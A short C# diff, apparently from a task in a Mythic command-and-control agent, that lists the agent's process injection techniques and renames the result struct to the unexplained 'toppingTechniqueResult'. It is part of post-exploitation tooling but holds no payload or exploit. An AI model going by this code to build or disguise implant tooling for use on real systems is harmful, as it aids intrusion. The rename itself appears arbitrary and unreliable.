@@ -18,7 +18,7 @@ namespace Tasks
     public class get_injection_techniques : Tasking
     {
         [DataContract]
-        internal struct InjectionTechniqueResult
+        internal struct toppingTechniqueResult
         {
             [DataMember(Name = "name")]
             public string Name;
@@ -35,10 +35,10 @@ namespace Tasks
             MythicTaskResponse resp;
             string[] techniques = _agent.GetInjectionManager().GetTechniques();
             Type cur = _agent.GetInjectionManager().GetCurrentTechnique();
-            List<InjectionTechniqueResult> results = new List<InjectionTechniqueResult>();
+            List<toppingTechniqueResult> results = new List<toppingTechniqueResult>();
             foreach (string t in techniques)
             {
-                results.Add(new InjectionTechniqueResult
+                results.Add(new toppingTechniqueResult
                 {
                     Name = t,
                     IsCurrent = t == cur.Name
